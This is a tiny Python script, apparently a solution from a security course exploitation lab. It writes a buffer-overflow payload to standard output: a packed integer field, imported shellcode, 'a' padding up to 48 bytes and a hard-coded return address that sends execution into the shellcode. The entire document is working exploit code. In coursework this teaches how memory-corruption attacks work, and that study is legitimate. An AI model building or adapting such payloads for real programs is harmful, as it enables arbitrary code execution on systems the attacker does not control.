#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(pack("<I", 0x40000004)+shellcode+b"\x61"*(48-len(shellcode))+pack("<I", 0xfffef5a0))